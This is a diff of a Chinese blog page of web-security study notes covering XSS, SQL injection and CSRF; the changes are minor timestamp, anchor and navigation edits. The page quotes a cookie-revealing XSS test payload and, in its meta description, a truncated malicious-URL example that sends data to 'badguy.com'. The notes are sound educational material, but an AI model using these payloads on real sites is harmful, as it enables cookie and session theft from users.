@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="像风走了八千里,不问归期">
 <meta property="og:description" content="XSS发生场景 在input标签中输入 &amp;quot;/&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;lt;!-,因此输入的字符被浏览器解析成js代码执行 恶意URLhttp://victim.com/search.asp?term=&amp;lt;script&amp;gt;window.open(&amp;quot;http://badguy.com?c">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-06-15T23:18:12.690Z">
+<meta property="og:updated_time" content="2018-06-18T03:50:16.612Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全">
 <meta name="twitter:description" content="XSS发生场景 在input标签中输入 &amp;quot;/&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&amp;lt;!-,因此输入的字符被浏览器解析成js代码执行 恶意URLhttp://victim.com/search.asp?term=&amp;lt;script&amp;gt;window.open(&amp;quot;http://badguy.com?c">
@@ -207,9 +207,8 @@ var _hmt = _hmt || [];
 <li>将用户输入的字符进行HTML Encode转码</li>
 <li>input输入框只允许输入规定的字符<h2 id="测试XSS漏洞"><a href="#测试XSS漏洞" class="headerlink" title="测试XSS漏洞"></a>测试XSS漏洞</h2></li>
 <li>在input标签中输入 <code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!-</code></li>
-<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器</li>
-</ol>
-<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ol>
+<li>高版本的浏览器通常有安全机制过滤XSS, 尽量使用低版本IE浏览器<a id="more"></a>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1></li>
 <li>用户输入的字符被解析成SQL脚本运行</li>
 </ol>
 <h1 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h1><h2 id="发生场景-1"><a href="#发生场景-1" class="headerlink" title="发生场景"></a>发生场景</h2><ol>
@@ -343,18 +342,18 @@ var _hmt = _hmt || [];
   
 <nav id="article-nav">
   
-    <a href="/blog/2018/06/12/OSI七层模型结构/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/blog/2018/06/16/python中正则的使用/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          OSI七层模型结构, TCP/IP四层模型学习笔记
+          python中正则的使用
         
       </div>
     </a>
   
   
-    <a href="/blog/2018/06/07/基于python + Selenium的自动化学习(unittest)/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">基于python + Selenium的自动化学习(unittest框架)</div>
+    <a href="/blog/2018/06/12/OSI七层模型结构/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">OSI七层模型结构, TCP/IP四层模型学习笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
